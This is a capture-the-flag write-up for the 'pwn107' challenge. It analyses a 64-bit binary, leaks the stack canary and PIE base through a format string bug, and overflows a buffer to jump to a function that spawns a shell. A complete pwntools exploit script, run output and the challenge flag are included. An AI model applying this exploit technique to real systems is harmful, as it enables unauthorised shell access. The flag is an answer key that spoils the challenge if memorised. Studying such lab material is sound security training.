# pwn107

- [Binary Analysis](#binary-analysis)
- [Exploit the Format String Vulnerability](#exploit-the-format-string-vulnerability)
- [Exploit the Buffer Overflow Vulnerability](#exploit-the-buffer-overflow-vulnerability)
- [Local Exploitation](#local-exploitation)
- [Remote Exploitation](#remote-exploitation)

```text

The challenge is running on port 9007

```

## Binary Analysis

```bash
$ ls 
pwn107 

$ file pwn107 
pwn107: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0579b2a29d47165653fbb791fb528c59e951a1a0, not stripped
```

#### checksec

``` bash
$ checksec --file=pwn107
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

The *radare2* tool is used to further analyze the track.

`radare2`

```text
[0x00000780]> afl
0x00000710    1      6 sym.imp.puts
0x00000720    1      6 sym.imp.__stack_chk_fail
0x00000730    1      6 sym.imp.system
0x00000740    1      6 sym.imp.printf
0x00000750    1      6 sym.imp.read
0x00000760    1      6 sym.imp.setvbuf
0x00000770    1      6 sym.imp.__cxa_finalize
0x00000780    1     42 entry0
0x000007b0    4     40 sym.deregister_tm_clones
0x000007f0    4     57 sym.register_tm_clones
0x00000840    5     51 entry.fini0
0x00000880    1     10 entry.init0
0x00000b00    1      2 sym.__libc_csu_fini
0x00000b04    1      9 sym._fini
0x00000912    3     58 sym.banner
0x00000a90    4    101 sym.__libc_csu_init
0x0000094c    3     70 sym.get_streak
0x00000992    3    243 main
0x0000088a    3    136 sym.setup
0x000006e8    3     23 sym._init

```

Among the symbols, the *main* function and *get_streak* are identified.

We proceed with the inspection of the disassembled code of the *main* function.

`main`

```text
[0x00000992]> pdfr
  ; ICOD XREF from entry0 @ 0x79d(r)
┌ 243: int main (int argc, char **argv, char **envp);
│ afv: vars(3:sp[0x10..0x48])
│ 0x00000992      55             push rbp
│ 0x00000993      4889e5         mov rbp, rsp
│ 0x00000996      4883ec40       sub rsp, 0x40
│ 0x0000099a      64488b0425..   mov rax, qword fs:[0x28]
│ 0x000009a3      488945f8       mov qword [canary], rax
│ 0x000009a7      31c0           xor eax, eax
│ 0x000009a9      b800000000     mov eax, 0
│ 0x000009ae      e8d7feffff     call sym.setup
│ 0x000009b3      b800000000     mov eax, 0
│ 0x000009b8      e855ffffff     call sym.banner
│ 0x000009bd      488d3da402..   lea rdi, "You are a good THM player \U0001f60e" ; const char *s
│ 0x000009c4      e847fdffff     call sym.imp.puts                     ; int puts(const char *s)
│ 0x000009c9      488d3db802..   lea rdi, "But yesterday you lost your streak \U0001f641" ; const char *s
│ 0x000009d0      e83bfdffff     call sym.imp.puts                     ; int puts(const char *s)
│ 0x000009d5      488d3dd402..   lea rdi, "You mailed about this to THM, and they responsed back with some questions" ; const char *s
│ 0x000009dc      e82ffdffff     call sym.imp.puts                     ; int puts(const char *s)
│ 0x000009e1      488d3d1803..   lea rdi, "Answer those questions and get your streak back\n" ; const char *s
│ 0x000009e8      e823fdffff     call sym.imp.puts                     ; int puts(const char *s)
│ 0x000009ed      488d3d4403..   lea rdi, "THM: What's your last streak? " ; const char *format
│ 0x000009f4      b800000000     mov eax, 0
│ 0x000009f9      e842fdffff     call sym.imp.printf                   ; int printf(const char *format)
│ 0x000009fe      488d45c0       lea rax, [format]
│ 0x00000a02      ba14000000     mov edx, 0x14                         ; size_t nbyte
│ 0x00000a07      4889c6         mov rsi, rax                          ; void *buf
│ 0x00000a0a      bf00000000     mov edi, 0                            ; int fildes
│ 0x00000a0f      b800000000     mov eax, 0
│ 0x00000a14      e837fdffff     call sym.imp.read                     ; ssize_t read(int fildes, void *buf, size_t nbyte)
│ 0x00000a19      488d3d3803..   lea rdi, "Thanks, Happy hacking!!\nYour current streak: " ; const char *format
│ 0x00000a20      b800000000     mov eax, 0
│ 0x00000a25      e816fdffff     call sym.imp.printf                   ; int printf(const char *format)
│ 0x00000a2a      488d45c0       lea rax, [format]
│ 0x00000a2e      4889c7         mov rdi, rax                          ; const char *format
│ 0x00000a31      b800000000     mov eax, 0
│ 0x00000a36      e805fdffff     call sym.imp.printf                   ; int printf(const char *format)
│ 0x00000a3b      488d3d4603..   lea rdi, "\n\n[Few days latter.... a notification pops up]\n" ; const char *s
│ 0x00000a42      e8c9fcffff     call sym.imp.puts                     ; int puts(const char *s)
│ 0x00000a47      488d3d6a03..   lea rdi, "Hi pwner \U0001f47e, keep hacking\U0001f469\u200d\U0001f4bb - We miss you!\U0001f622" ; const char *s
│ 0x00000a4e      e8bdfcffff     call sym.imp.puts                     ; int puts(const char *s)
│ 0x00000a53      488d45e0       lea rax, [buf]
│ 0x00000a57      ba00020000     mov edx, 0x200                        ; size_t nbyte
│ 0x00000a5c      4889c6         mov rsi, rax                          ; void *buf
│ 0x00000a5f      bf00000000     mov edi, 0                            ; int fildes
│ 0x00000a64      b800000000     mov eax, 0
│ 0x00000a69      e8e2fcffff     call sym.imp.read                     ; ssize_t read(int fildes, void *buf, size_t nbyte)
│ 0x00000a6e      90             nop
│ 0x00000a6f      488b45f8       mov rax, qword [canary]
│ 0x00000a73      6448330425..   xor rax, qword fs:[0x28]
│ 0x00000a7c      7405           je 0xa83
| // true: 0x00000a83  false: 0x00000a7e
│ 0x00000a7e      e89dfcffff     call sym.imp.__stack_chk_fail         ; void __stack_chk_fail(void)

│ ; CODE XREF from main @ 0xa7c(x)
│ 0x00000a83      c9             leave
└ 0x00000a84      c3             ret

[0x00000992]> afv
var int64_t canary @ rbp-0x8
var void * buf @ rbp-0x20
var char * format @ rbp-0x40

```

The *main* function has a **Format String Vulnerability** in the `printf` function, which processes user input supplied with the `read` function.

```text

│ 0x000009fe      488d45c0       lea rax, [format]
│ 0x00000a02      ba14000000     mov edx, 0x14                         ; size_t nbyte
│ 0x00000a07      4889c6         mov rsi, rax                          ; void *buf
│ 0x00000a0a      bf00000000     mov edi, 0                            ; int fildes
│ 0x00000a0f      b800000000     mov eax, 0
│ 0x00000a14      e837fdffff     call sym.imp.read                     ; ssize_t read(int fildes, void *buf, size_t nbyte)

│ 0x00000a2a      488d45c0       lea rax, [format]
│ 0x00000a2e      4889c7         mov rdi, rax                          ; const char *format
│ 0x00000a31      b800000000     mov eax, 0
│ 0x00000a36      e805fdffff     call sym.imp.printf                   ; int printf(const char *format)

```

There is also a **Buffer Overflow Vulnerability** in the `read` function, which allows writing beyond the *buffer*.

```text
┌ 243: int main (int argc, char **argv, char **envp);
│ afv: vars(3:sp[0x10..0x48])
│ 0x00000992      55             push rbp
│ 0x00000993      4889e5         mov rbp, rsp
│ 0x00000996      4883ec40       sub rsp, 0x40
│ 0x0000099a      64488b0425..   mov rax, qword fs:[0x28]
│ 0x000009a3      488945f8       mov qword [canary], rax

│ 0x00000a53      488d45e0       lea rax, [buf]
│ 0x00000a57      ba00020000     mov edx, 0x200                        ; size_t nbyte
│ 0x00000a5c      4889c6         mov rsi, rax                          ; void *buf
│ 0x00000a5f      bf00000000     mov edi, 0                            ; int fildes
│ 0x00000a64      b800000000     mov eax, 0
│ 0x00000a69      e8e2fcffff     call sym.imp.read                     ; ssize_t read(int fildes, void *buf, size_t nbyte)

var int64_t canary @ rbp-0x8
var void * buf @ rbp-0x20
var char * format @ rbp-0x40
```

However, the *BOF* is mitigated by the **canary**, a stack-allocated value that protects the *saved rip*.

Basically, the goal would be to invoke the `get_streak` function.

`radare2`

```text
[0x00000780]> s sym.get_streak 
[0x0000094c]> pdf
┌ 70: sym.get_streak ();
│ afv: vars(1:sp[0x10..0x10])
│           0x0000094c      55             push rbp
│           0x0000094d      4889e5         mov rbp, rsp
│           0x00000950      4883ec10       sub rsp, 0x10
│           0x00000954      64488b0425..   mov rax, qword fs:[0x28]
│           0x0000095d      488945f8       mov qword [canary], rax
│           0x00000961      31c0           xor eax, eax
│           0x00000963      488d3dbe02..   lea rdi, "This your last streak back, don't do this mistake again" ; const char *s
│           0x0000096a      e8a1fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0000096f      488d3dea02..   lea rdi, "/bin/sh"          ; const char *string
│           0x00000976      e8b5fdffff     call sym.imp.system         ; int system(const char *string)
│           0x0000097b      90             nop
│           0x0000097c      488b45f8       mov rax, qword [canary]
│           0x00000980      6448330425..   xor rax, qword fs:[0x28]
│       ┌─< 0x00000989      7405           je 0x990
│       │   0x0000098b      e890fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       │   ; CODE XREF from sym.get_streak @ 0x989(x)
│       └─> 0x00000990      c9             leave
└           0x00000991      c3             ret

[0x0000094c]> afv
var int64_t canary @ rbp-0x8

```

So, what to do?

1. [Exploit the Format String Vulnerability](#exploit-the-format-string-vulnerability) to perform a memory leak.
2. [Exploit the Buffer Overflow Vulnerability](#exploit-the-buffer-overflow-vulnerability) to hijack the program execution.

## Exploit The Format String Vulnerability
---
- [Leak the canary](#leak-the-canary)
- [Leak the virtual address](#leak-the-virtual-address)

### Leak the canary

The idea is to read the value of the *canary* that protects the stack from *BOF*.

```text
var int64_t canary @ rbp-0x8
var char * format @ rbp-0x40

0x40 - 0x8 = 56 bytes

56 / 8 = 7 qword

# x86-64 calling convention (6 registers)
6 + 7 qword = 13 qword

canary@ 13 qword

```

The correctness of the captured canary value is verified with *gdb*.

`gdb`

```text
$ gdb-pwndbg pwn107

pwndbg> set stop-on-solib-events 1
pwndbg> run

pwndbg> breakrva 0xa2a              # Breakpoint at the next statement below the printf
Breakpoint 1 at 0x555555400a2a

pwndbg> continue
pwndbg> continue

%13$p

pwndbg> canary
AT_RANDOM = 0x7fffffffe2c9 # points to (not masked) global canary value
Canary    = 0x8f9f50a185c68300 (may be incorrect on != glibc)
Thread 1: Found valid canaries.
00:0000│  0x7fffffffbb68 ◂— 0x8f9f50a185c68300

pwndbg> continue
Continuing.
0x8f9f50a185c68300

```

Works!

### Leak the virtual address

To exploit *BOF* it becomes necessary to know the *virtual address* of the *get_streak* function. In fact, remember that from [checksec](#checksec) the binary has **PIE** protection, so we do not know a priori at which memory address the program will be allocated, and consequently also its components.

Continuing the dynamic analysis of the program with *gdb*, we analyze the stack:

`gdb`
```text
Hi pwner 👾, keep hacking👩‍💻 - We miss you!😢
^C 

pwndbg> piebase
Calculated VA from pwn107 = 0x555555400000

pwndbg> stack 20
00:0000│ rsp 0x7fffffffdde8 —▸ 0x555555400a6e (main+220) ◂— nop 
01:0008│-040 0x7fffffffddf0 ◂— 0xa7024333125 /* '%13$p\n' */
02:0010│-038 0x7fffffffddf8 ◂— 0x10101000000
03:0018│-030 0x7fffffffde00 ◂— 2
04:0020│-028 0x7fffffffde08 ◂— 0xf8bfbff
05:0028│ rsi 0x7fffffffde10 —▸ 0x7fffffffe2d9 ◂— 0x34365f363878 /* 'x86_64' */
06:0030│-018 0x7fffffffde18 ◂— 0x64 /* 'd' */
07:0038│-010 0x7fffffffde20 ◂— 0x1000
08:0040│-008 0x7fffffffde28 ◂— 0x8f9f50a185c68300
09:0048│ rbp 0x7fffffffde30 ◂— 1
0a:0050│+008 0x7fffffffde38 —▸ 0x7ffff7c29d90 (__libc_start_call_main+128) ◂— mov edi, eax
0b:0058│+010 0x7fffffffde40 ◂— 0
0c:0060│+018 0x7fffffffde48 —▸ 0x555555400992 (main) ◂— push rbp
0d:0068│+020 0x7fffffffde50 ◂— 0x1ffffdf30
0e:0070│+028 0x7fffffffde58 —▸ 0x7fffffffdf48 —▸ 0x7fffffffe2ec ◂— 'pwn107'
0f:0078│+030 0x7fffffffde60 ◂— 0
10:0080│+038 0x7fffffffde68 ◂— 0x3abad525451d5e3a
11:0088│+040 0x7fffffffde70 —▸ 0x7fffffffdf48 —▸ 0x7fffffffe2ec ◂— 'pwn107'
12:0090│+048 0x7fffffffde78 —▸ 0x555555400992 (main) ◂— push rbp
13:0098│+050 0x7fffffffde80 ◂— 0

pwndbg> x/i 0x555555400992
   0x555555400992 <main>:       push   rbp
```

Note that above the *saved rbp* of the current *stack frame*, the *saved rip* points to a memory address of the *libc* (see the *vmmap* result below). While at a distance of `rbp+0x18` the base memory address of the *main* function is allocated on the stack (see the *x/i* result).

`gdb`
```text
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File (set vmmap-prefer-relpaths on)
    0x555555400000     0x555555401000 r-xp     1000      0 pwn107
    0x555555601000     0x555555602000 r--p     1000   1000 pwn107
    0x555555602000     0x555555603000 rw-p     1000   2000 pwn107
    0x7ffff7c00000     0x7ffff7c28000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7dbd000     0x7ffff7e15000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e15000     0x7ffff7e16000 ---p     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e16000     0x7ffff7e1a000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e1a000     0x7ffff7e1c000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e1c000     0x7ffff7e29000 rw-p     d000      0 [anon_7ffff7e1c]
    0x7ffff7fa7000     0x7ffff7faa000 rw-p     3000      0 [anon_7ffff7fa7]
    0x7ffff7fbb000     0x7ffff7fbd000 rw-p     2000      0 [anon_7ffff7fbb]
    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000      0 [vvar]
    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000      0 [vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]

```

So:

```text
var int64_t canary @ rbp-0x8
var char * format @ rbp-0x40

0x40 - 0x8 = 56 bytes

56 / 8 = 7 qword

# x86-64 calling convention (6 registers)
6 + 7 qword = 13 qword

canary@ 13 qword

canary @ rbp-0x8 => rbp@ 14 qword

main memory address @ rbp+0x18

0x18 = 24 bytes

24 / 8 = 3 qword

14 + 3 = 17 qword

main memory address @ 17 qword

```

This hypothesis is verified with gdb

`gdb`
```text
pwndbg> run
pwndbg> continue
pwndbg> continue

THM: What's your last streak? %13$p.%17$p

pwndbg> continue
Continuing.
0x3346c2194b110200.0x555555400992

Hi pwner 👾, keep hacking👩‍💻 - We miss you!😢
^C

pwndbg> x/i 0x555555400992
   0x555555400992 <main>:       push   rbp

```

GG.

### Exploit the Buffer Overflow Vulnerability

The idea would be to exploit the *memory leaks* obtained previously to exploit the *BOF* to divert the execution flow towards `get_streak`.

First we need to get the offsets of *main* and *get_streak*.

```bash
$ readelf --syms pwn107 | grep -E "(main|get_streak)"
    64: 000000000000094c    70 FUNC    GLOBAL DEFAULT   14 get_streak
    66: 0000000000000992   243 FUNC    GLOBAL DEFAULT   14 main

```

Taking into account the *main* function:

`radare2`
```text
┌ 243: int main (int argc, char **argv, char **envp);
│ afv: vars(3:sp[0x10..0x48])
│ 0x00000992      55             push rbp
│ 0x00000993      4889e5         mov rbp, rsp
│ 0x00000996      4883ec40       sub rsp, 0x40
│ 0x0000099a      64488b0425..   mov rax, qword fs:[0x28]
│ 0x000009a3      488945f8       mov qword [canary], rax

│ 0x00000a53      488d45e0       lea rax, [buf]
│ 0x00000a57      ba00020000     mov edx, 0x200                        ; size_t nbyte
│ 0x00000a5c      4889c6         mov rsi, rax                          ; void *buf
│ 0x00000a5f      bf00000000     mov edi, 0                            ; int fildes
│ 0x00000a64      b800000000     mov eax, 0
│ 0x00000a69      e8e2fcffff     call sym.imp.read                     ; ssize_t read(int fildes, void *buf, size_t nbyte)

var int64_t canary @ rbp-0x8
var void * buf @ rbp-0x20
var char * format @ rbp-0x40

```

And having **canary** and **main_vaddr**, the *payload* to exploit the *BOF* must have the following form:

- *padding*: 0x20 - 0x8 = 24 bytes to fill the buffer
- **canary**
- *dummy_rbp* 0x8 bytes
- **get_streak virtual address**: (*main_vaddr* - *main_offset*) + *get_streak_offset* = *base_vaddr* + *get_streak_offset*

## Local Exploitation

While running the exploit, a stack alignment issue occurred:

`gdb`

```text
► 0x735744250973 <do_system+115>    movaps xmmword ptr [rsp], xmm1                   <[0x7ffe7e5235f8] not aligned to 16 bytes>
```

This is solved by diverting control to the statement immediately following the prologue of the *get_streak* function.

`radare2`

```text
[0x0000094c]> pdf
┌ 70: sym.get_streak ();
│ afv: vars(1:sp[0x10..0x10])
│           0x0000094c      55             push rbp
│           0x0000094d      4889e5         mov rbp, rsp
│           0x00000950      4883ec10       sub rsp, 0x10
│           0x00000954      64488b0425..   mov rax, qword fs:[0x28]
│           0x0000095d      488945f8       mov qword [canary], rax
│           0x00000961      31c0           xor eax, eax                 <=== here

```

Below is the `exploit` script built for *debugging*, *local* and *remote* exploitation.

```python
#!/usr/bin/env python3
from pwn import context, ELF, process, gdb, remote, flat, info, success

exe = './pwn107'
elf = context.binary = ELF(exe, checksec=False)
#context.log_level = 'debug'

gdbinit='''
init-pwndbg
set stop-on-solib-events 1
# after the printf
breakrva 0x00000a3b
# after the read
breakrva 0x00000a6e
continue
'''

REMOTE, PORT='10.10.218.76', 9007

io=process([exe])
#io=gdb.debug([exe], gdbscript=gdbinit)
#io=remote(REMOTE, PORT)

#### Stack offsets
canary_offset = 13
vaddr_offset = 17 

#### Program offsets
main_paddr = 0x992
get_streak_paddr = 0x961 # Instruction next to the prolog

#### Stage 1: Leak the memory ####

success("#### Stage 1: Leak The Memory ####\n")

separator='.'
payload=flat([
	'%{offset}$#lx'.format(offset= canary_offset).encode(),
	separator.encode(),
	'%{offset}$#lx'.format(offset= vaddr_offset).encode() # hex format
])

io.sendlineafter(b'THM: What\'s your last streak?', payload)
data=io.recvlines(2)[1].decode()

#### Get the canary and virtual address
data=data.strip().split(':')[1].split(separator)
canary=int(data[0], 16)
vaddr_leaked=int(data[1], 16)

info(f"canary: {hex(canary)}")
info(f"vaddr_leaked: {hex(vaddr_leaked)}")

#### Stage 2: Buffer Overflow ####

success("#### Stage 2: Buffer Overflow ####\n")

base_vaddr=vaddr_leaked-main_paddr

get_streak_vaddr=base_vaddr+get_streak_paddr

info(f"base_vaddr: {hex(base_vaddr)}")
info(f"get_streak_vaddr: {hex(get_streak_vaddr)}")

payload=flat({
    # padding
    24: canary,
    # dummy rbp
    40: get_streak_vaddr
})

io.sendline(payload)
io.interactive()

```

Result:

```bash
$ ./exploit 
[+] Starting local process './pwn107': pid 43006
[+] #### Stage 1: Leak The Memory ####
[*] canary: 0xa276be80f53c4700
[*] vaddr_leaked: 0x5ab36c600992
[+] #### Stage 2: Buffer Overflow ####
[*] base_vaddr: 0x5ab36c600000
[*] get_streak_vaddr: 0x5ab36c600961
[*] Switching to interactive mode
\x02

[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩‍💻 - We miss you!😢
This your last streak back, don't do this mistake again
$ whoami
ap
$ 

```

## Remote Exploitation

Trying to run the exploit remotely.

```bash
$ ./exploit 
[+] Opening connection to 10.10.218.76 on port 9007: Done
[+] #### Stage 1: Leak The Memory ####
[*] canary: 0xcb26e9f197ff1700
[*] vaddr_leaked: 0x7ffea29d8258
[+] #### Stage 2: Buffer Overflow ####
[*] base_vaddr: 0x7ffea29d78c6
[*] get_streak_vaddr: 0x7ffea29d8227
[*] Switching to interactive mode
@\x9b\x10v\xf1\x7f

[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩‍💻 - We miss you!😢
[*] Got EOF while reading in interactive
$ ls
$ ls
[*] Closed connection to 10.10.218.76 port 9007
[*] Got EOF while sending in interactive

```

There is a problem, remotely it doesn't work. It could be a problem with the offset of the *virtual memory address*, because `0x7ffea29d8227` seems to be more of a *libc memory address*.

It tries iteratively increasing the `vaddr_offset` (see the previous section) and for `vaddr_offset = 19` it gives the expected result:

```bash
$ ./exploit 
[+] Opening connection to 10.10.218.76 on port 9007: Done
[+] #### Stage 1: Leak The Memory ####
[*] canary: 0xf59bb14e672b4d00
[*] vaddr_leaked: 0x565115bba992
[+] #### Stage 2: Buffer Overflow ####
[*] base_vaddr: 0x565115bba000
[*] get_streak_vaddr: 0x565115bba961
[*] Switching to interactive mode
@[_\xb4\xba\x7f

[Few days latter.... a notification pops up]

Hi pwner 👾, keep hacking👩‍💻 - We miss you!😢
This your last streak back, don't do this mistake again
$ ls
flag.txt
pwn107
pwn107.c
$ cat flag.txt
THM{whY_i_us3d_pr1ntF()_w1thoUt_fmting??}
$  

```

GG :3

---
